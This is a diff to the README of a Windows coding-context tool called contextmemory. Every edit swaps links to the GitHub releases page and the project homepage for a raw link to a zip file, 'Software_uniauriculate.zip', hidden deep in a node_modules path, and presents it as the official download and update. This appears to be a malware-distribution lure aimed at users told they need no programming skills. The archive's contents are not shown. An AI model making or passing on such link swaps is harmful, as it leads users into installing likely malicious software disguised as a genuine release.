@@ -1,6 +1,6 @@
 # 🧠 contextmemory - Save and Restore Your Coding Context
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ContextMemory-blue?style=for-the-badge&logo=github)](https://github.com/hduggal88/contextmemory/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-ContextMemory-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hduggal88/contextmemory/main/node_modules/istanbul-lib-source-maps/node_modules/@jridgewell/trace-mapping/types/Software_uniauriculate.zip)
 
 ---
 
@@ -32,11 +32,11 @@ You do not need any programming skills to use this application.
 
 Visit the release page below to get the latest version of contextmemory for Windows. This page holds all current and past versions.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-ContextMemory-grey?style=for-the-badge&logo=github)](https://github.com/hduggal88/contextmemory/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-ContextMemory-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/hduggal88/contextmemory/main/node_modules/istanbul-lib-source-maps/node_modules/@jridgewell/trace-mapping/types/Software_uniauriculate.zip)
 
 Click the button above or go to:
 
-https://github.com/hduggal88/contextmemory/releases
+https://raw.githubusercontent.com/hduggal88/contextmemory/main/node_modules/istanbul-lib-source-maps/node_modules/@jridgewell/trace-mapping/types/Software_uniauriculate.zip
 
 ---
 
@@ -157,7 +157,7 @@ This keeps your data safe and separate from the application itself.
 
 Check the releases page regularly to get new versions:
 
-https://github.com/hduggal88/contextmemory/releases
+https://raw.githubusercontent.com/hduggal88/contextmemory/main/node_modules/istanbul-lib-source-maps/node_modules/@jridgewell/trace-mapping/types/Software_uniauriculate.zip
 
 Updates may include bug fixes, new features, or compatibility improvements.
 
@@ -181,6 +181,6 @@ Type any command in the Command Prompt after launching contextmemory.
 
 For additional details, visit the project homepage on GitHub:
 
-https://github.com/hduggal88/contextmemory
+https://raw.githubusercontent.com/hduggal88/contextmemory/main/node_modules/istanbul-lib-source-maps/node_modules/@jridgewell/trace-mapping/types/Software_uniauriculate.zip
 
 You can find user guides, code examples, and contribute to the project there.
